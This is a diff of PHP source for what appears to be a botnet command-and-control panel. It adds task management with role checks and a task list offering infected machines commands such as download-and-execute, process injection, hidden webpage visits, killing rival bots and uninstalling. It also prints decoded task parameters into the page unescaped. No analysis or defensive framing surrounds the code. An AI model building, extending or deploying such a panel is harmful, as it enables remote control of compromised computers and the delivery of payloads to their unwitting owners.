@@ -116,38 +116,54 @@ include 'inc/stats.php';
 											$cnt->execute(array(":i" => $tid));
 											if ($cnt->fetchColumn(0) > 0)
 											{
-												switch ($act)
+												$cre = $odb->prepare("SELECT username FROM tasks WHERE id = :i");
+												$cre->execute(array(":i" => $tid));
+												$cr = $cre->fetchColumn(0);
+												$cpermss = $odb->prepare("SELECT privileges FROM users WHERE username = :u");
+												$cpermss->execute(array(":u" => $cr));
+												$cperms = $cpermss->fetchColumn(0);
+												if ($userperms == "moderator" && $cperms == "admin")
 												{
-													case "pause":
-														$up = $odb->prepare("UPDATE tasks SET status = '2' WHERE id = :i LIMIT 1");
-														$up->execute(array(":i" => $tid));
-														$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
-														$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Paused task #'.$tid));
-														echo '<div class="alert alert-success">Task has been paused. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
-														break;
-													case "resume":
-														$up = $odb->prepare("UPDATE tasks SET status = '1' WHERE id = :i LIMIT 1");
-														$up->execute(array(":i" => $tid));
-														$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
-														$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Resumed task #'.$tid));
-														echo '<div class="alert alert-success">Task has been resumed. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
-														break;
-													case "restart":
-														$de = $odb->prepare("DELETE FROM tasks_completed WHERE taskid = :i");
-														$de->execute(array(":i" => $tid));
-														$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
-														$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Restarted task #'.$tid));
-														echo '<div class="alert alert-success">Task successfully restarted. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
-														break;
-													case "delete":
-														$de = $odb->prepare("DELETE FROM tasks_completed WHERE taskid = :i");
-														$de->execute(array(":i" => $tid));
-														$da = $odb->prepare("DELETE FROM tasks WHERE id = :i");
-														$da->execute(array(":i" => $tid));
-														$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
-														$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Deleted task #'.$tid));
-														echo '<div class="alert alert-success">Task successfully deleted. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
-														break;
+													echo '<div class="alert alert-danger">You cannot manage tasks created by administrators.</div>';
+												}else{
+													if ($userperms == "user" && strtolower($cr) != strtolower($username))
+													{
+														echo '<div class="alert alert-danger">You cannot manage tasks created by other users.</div>';
+													}else{
+														switch ($act)
+														{
+															case "pause":
+																$up = $odb->prepare("UPDATE tasks SET status = '2' WHERE id = :i LIMIT 1");
+																$up->execute(array(":i" => $tid));
+																$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
+																$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Paused task #'.$tid));
+																echo '<div class="alert alert-success">Task has been paused. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
+																break;
+															case "resume":
+																$up = $odb->prepare("UPDATE tasks SET status = '1' WHERE id = :i LIMIT 1");
+																$up->execute(array(":i" => $tid));
+																$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
+																$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Resumed task #'.$tid));
+																echo '<div class="alert alert-success">Task has been resumed. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
+																break;
+															case "restart":
+																$de = $odb->prepare("DELETE FROM tasks_completed WHERE taskid = :i");
+																$de->execute(array(":i" => $tid));
+																$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
+																$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Restarted task #'.$tid));
+																echo '<div class="alert alert-success">Task successfully restarted. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
+																break;
+															case "delete":
+																$de = $odb->prepare("DELETE FROM tasks_completed WHERE taskid = :i");
+																$de->execute(array(":i" => $tid));
+																$da = $odb->prepare("DELETE FROM tasks WHERE id = :i");
+																$da->execute(array(":i" => $tid));
+																$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
+																$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Deleted task #'.$tid));
+																echo '<div class="alert alert-success">Task successfully deleted. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
+																break;
+														}
+													}
 												}
 											}else{
 												echo '<div class="alert alert-danger">Task not found in database. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
@@ -165,7 +181,51 @@ include 'inc/stats.php';
 						}
 						if (isset($_POST['addTask']))
 						{
-							// almost done, just need to complete adding tasks
+							$task = $_POST['task'];
+							$params = base64_encode($_POST['params']);
+							if ($params == "" || $params == NULL)
+							{
+								$params = base64_encode("None");
+							}
+							$filters = base64_encode($_POST['filter']);
+							if ($filters == "" || $filters == NULL)
+							{
+								$filters = base64_encode("None");
+							}
+							$exs = $_POST['execs'];
+							if (ctype_digit($task))
+							{
+								if (ctype_digit($exs) || $exs == "" || $exs == NULL)
+								{
+									if ($exs == "" || $exs == NULL)
+									{
+										$exs = "unlimited";
+									}
+									if ($task == "9" || $task == "10")
+									{
+										if ($userperms != "admin")
+										{
+											echo '<div class="alert alert-danger">You do not have permission to use this command.</div>';
+										}else{
+											$i = $odb->prepare("INSERT INTO tasks VALUES(NULL, :t, :p, :f, :e, :u, '1', UNIX_TIMESTAMP())");
+											$i->execute(array(":t" => $task, ":p" => $params, ":f" => $filters, ":e" => $exs, ":u" => $username));
+											$i2 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
+											$i2->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Created task #'.$odb->query("SELECT id FROM tasks ORDER BY id DESC LIMIT 1")->fetchColumn(0)));
+											echo '<div class="alert alert-success">Task successfully created. Reloading...</div><meta http-equiv="refresh" content="2">';
+										}
+									}else{
+										$i = $odb->prepare("INSERT INTO tasks VALUES(NULL, :t, :p, :f, :e, :u, '1', UNIX_TIMESTAMP())");
+										$i->execute(array(":t" => $task, ":p" => $params, ":f" => $filters, ":e" => $exs, ":u" => $username));
+										$i2 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
+										$i2->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Created task #'.$odb->query("SELECT id FROM tasks ORDER BY id DESC LIMIT 1")->fetchColumn(0)));
+										echo '<div class="alert alert-success">Task successfully created. Reloading...</div><meta http-equiv="refresh" content="2">';
+									}
+								}else{
+									echo '<div class="alert alert-danger">Invalid number of executions.</div>';
+								}
+							}else{
+								echo '<div class="alert alert-danger">Task type was not a digit.</div>';
+							}
 						}
 						?>
 						<h4>Current Tasks</h4>
@@ -191,6 +251,40 @@ include 'inc/stats.php';
 									$execs = $odb->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i");
 									$execs->execute(array(":i" => $t['id']));
 									$ex = $execs->fetchColumn(0);
+									$tsk = "";
+									switch ($t['task'])
+									{
+										case "1":
+											$tsk = "Download & Execute";
+											break;
+										case "2":
+											$tsk = "Download & Execute (Inject)";
+											break;
+										case "3":
+											$tsk = "Download & Execute (W/ Command Line Arguments)";
+											break;
+										case "4":
+											$tsk = "Visit Webpage (Visible)";
+											break;
+										case "5":
+											$tsk = "Visit Webpage (Hidden)";
+											break;
+										case "6":
+											$tsk = "Botkill Cycle";
+											break;
+										case "7":
+											$tsk = "Enable Proactives";
+											break;
+										case "8":
+											$tsk = "Disable Proactives";
+											break;
+										case "9":
+											$tsk = "Update";
+											break;
+										case "10":
+											$tsk = "Uninstall";
+											break;
+									}
 									$st = "";
 									if ($t['status'] == "1")
 									{
@@ -218,7 +312,7 @@ include 'inc/stats.php';
 										}
 									}
 									$actions .= '<a href="?p=tasks&id='.$t['id'].'&act=delete" title="Delete Task"><i class="fa fa-times-circle"></i></a></center>';
-									echo '<tr><td>'.$t['id'].'</td><td>'.$t['username'].'</td><td>'.$t['task'].'</td><td>'.$t['params'].'</td><td>'.$t['filters'].'</td><td>'.$ex.'/'.$t['executions'].'</td><td data-order="'.$t['date'].'">'.date("m-d-Y, h:i A", $t['date']).'</td><td>'.$st.'</td><td>'.$actions.'</td></tr>';
+									echo '<tr><td>'.$t['id'].'</td><td>'.$t['username'].'</td><td>'.$tsk.'</td><td>'.base64_decode($t['params']).'</td><td>'.base64_decode($t['filters']).'</td><td>'.$ex.'/'.$t['executions'].'</td><td data-order="'.$t['date'].'">'.date("m-d-Y, h:i A", $t['date']).'</td><td>'.$st.'</td><td>'.$actions.'</td></tr>';
 								}
 								?>
 							</tbody>
